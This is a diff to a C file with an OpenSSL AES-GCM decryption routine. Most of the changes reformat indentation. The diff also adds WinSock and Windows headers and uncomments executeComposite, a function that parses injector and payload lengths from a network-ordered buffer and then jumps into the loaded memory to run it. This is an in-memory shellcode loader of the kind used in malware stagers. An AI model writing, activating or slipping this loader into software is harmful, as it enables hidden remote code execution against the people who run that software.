@@ -2,6 +2,8 @@
 #include <openssl/sha.h>
 #include <string.h>
 #include <openssl/evp.h>
+#include <WinSock2.h>
+#include <Windows.h>
 
 #define AES_KEYLEN 32
 #define GCM_IV_LEN 12
@@ -45,9 +47,9 @@ unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, 
     }
 
     if (EVP_CIPHER_CTX_ctrl(ctx,
-                            EVP_CTRL_GCM_SET_IVLEN,
-                            GCM_IV_LEN,
-                            NULL) != 1) {
+        EVP_CTRL_GCM_SET_IVLEN,
+        GCM_IV_LEN,
+        NULL) != 1) {
         EVP_CIPHER_CTX_free(ctx);
         free(plaintext);
         return NULL;
@@ -60,10 +62,10 @@ unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, 
     }
 
     if (EVP_DecryptUpdate(ctx,
-                          plaintext,
-                          &len,
-                          ciphertext,
-                          ciphertext_len) != 1) {
+        plaintext,
+        &len,
+        ciphertext,
+        ciphertext_len) != 1) {
         EVP_CIPHER_CTX_free(ctx);
         free(plaintext);
         return NULL;
@@ -73,9 +75,9 @@ unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, 
 
     // Set expected tag BEFORE final
     if (EVP_CIPHER_CTX_ctrl(ctx,
-                            EVP_CTRL_GCM_SET_TAG,
-                            GCM_TAG_LEN,
-                            tag) != 1) {
+        EVP_CTRL_GCM_SET_TAG,
+        GCM_TAG_LEN,
+        tag) != 1) {
         EVP_CIPHER_CTX_free(ctx);
         free(plaintext);
         return NULL;
@@ -83,8 +85,8 @@ unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, 
 
     // Verify authentication
     if (EVP_DecryptFinal_ex(ctx,
-                            plaintext + len,
-                            &len) != 1) {
+        plaintext + len,
+        &len) != 1) {
         // Authentication failed
         EVP_CIPHER_CTX_free(ctx);
         free(plaintext);
@@ -98,11 +100,11 @@ unsigned char *decrypt(unsigned char *key, unsigned char *input, int input_len, 
     EVP_CIPHER_CTX_free(ctx);
     return plaintext;
 }
-/*
+
 void executeComposite(unsigned char *buf, int len){
 
-    uint32_t injector_len = *(uint32_t*)buf;
-    uint32_t payload_len  = *(uint32_t*)(buf + 4);
+    uint32_t injector_len = ntohl(*(uint32_t*)buf);
+    uint32_t payload_len = ntohl(*(uint32_t*)(buf + 4));
 
     unsigned char *injector = buf + 8;
     unsigned char *payload  = buf + 8 + injector_len;
@@ -145,4 +147,3 @@ void executeComposite(unsigned char *buf, int len){
     void (*entry)(void*, uint32_t) = mem;
     entry((unsigned char*)mem + injector_len, payload_len);
 }
-*/
